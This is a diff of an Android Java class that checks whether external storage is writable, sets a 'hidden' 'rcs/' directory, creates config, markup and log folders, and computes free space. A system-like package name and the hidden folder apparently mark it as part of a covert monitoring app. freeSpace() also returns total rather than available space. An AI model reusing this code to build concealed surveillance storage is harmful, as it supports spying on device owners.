@@ -12,6 +12,7 @@ package com.android.service.file;
 import java.io.File;
 
 import android.os.Environment;
+import android.os.StatFs;
 import android.util.Log;
 
 // TODO: Auto-generated Javadoc
@@ -60,14 +61,15 @@ public class Path {
 	 */
 	public static boolean makeDirs() {
 		try {
-			checkStorage();
+			if (haveStorage()) {
 
-			Log.d("QZ", TAG + " (makeDirs): hidden = " + hidden());
-			createDirectory(conf());
-			createDirectory(markup());
-			createDirectory(logs());
+				Log.d("QZ", TAG + " (makeDirs): hidden = " + hidden());
+				createDirectory(conf());
+				createDirectory(markup());
+				createDirectory(logs());
 
-			return true;
+				return true;
+			}
 		} catch (final Exception e) {
 			Log.d("QZ", TAG + " Error: " + e.toString());
 		}
@@ -77,7 +79,7 @@ public class Path {
 	/**
 	 * Check storage.
 	 */
-	private static void checkStorage() {
+	public static boolean haveStorage() {
 		boolean mExternalStorageAvailable = false;
 		boolean mExternalStorageWriteable = false;
 		final String state = Environment.getExternalStorageState();
@@ -98,8 +100,10 @@ public class Path {
 
 		if (mExternalStorageWriteable) {
 			hidden = Environment.getExternalStorageDirectory() + "/" + "rcs/";
+			return true;
 		} else {
-			hidden = "~/rcs/";
+			hidden = null;
+			return false;
 		}
 	}
 
@@ -161,8 +165,18 @@ public class Path {
 	 * @return the long
 	 */
 	public static long freeSpace() {
-		// TODO Auto-generated method stub
-		return Long.MAX_VALUE;
+		if (haveStorage()) {
+			StatFs stat = new StatFs(Environment.getExternalStorageDirectory()
+					.getPath());
+			long bytesAvailable = (long) stat.getBlockSize()
+					* (long) stat.getBlockCount();
+			long megAvailable = bytesAvailable / 1048576;
+			Log.d("QZ", TAG + " (freeSpace): " + megAvailable + " MiB");
+			return bytesAvailable;
+		} else {
+			Log.d("QZ", TAG + " (freeSpace) Error: no external path");
+			return 0;
+		}
 	}
 
 }
